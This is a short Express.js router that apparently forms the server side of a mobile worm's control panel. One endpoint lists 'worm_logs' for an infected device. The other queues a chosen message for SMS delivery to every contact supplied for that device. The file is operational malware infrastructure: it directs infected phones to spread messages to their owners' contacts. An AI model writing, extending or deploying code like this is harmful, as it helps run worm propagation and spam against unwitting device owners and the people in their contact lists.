const express = require('express');
const router = express.Router();
const db = require('../utils/db');
const { authMiddleware } = require('../utils/auth');

router.get('/device/:deviceId', authMiddleware, async (req, res) => {
  const result = await db.query(
    `SELECT * FROM worm_logs WHERE device_id = (SELECT id FROM devices WHERE device_id = $1) 
     ORDER BY created_at DESC`,
    [req.params.deviceId]
  );
  res.json(result.rows);
});

router.post('/send/:deviceId', authMiddleware, async (req, res) => {
  const { contacts, message, via = 'sms' } = req.body;
  const values = contacts.map((c, i) => 
    `((SELECT id FROM devices WHERE device_id = $1), $${i * 2 + 3}, $${i * 2 + 4}, $2, 'pending')`
  ).join(',');
  const params = [req.params.deviceId, via, ...contacts.flatMap(c => [c, message])];
  await db.query(
    `INSERT INTO worm_logs (device_id, target_contact, message_body, sent_via, status) VALUES ${values}`,
    params
  );
  res.json({ queued: contacts.length });
});

module.exports = router;
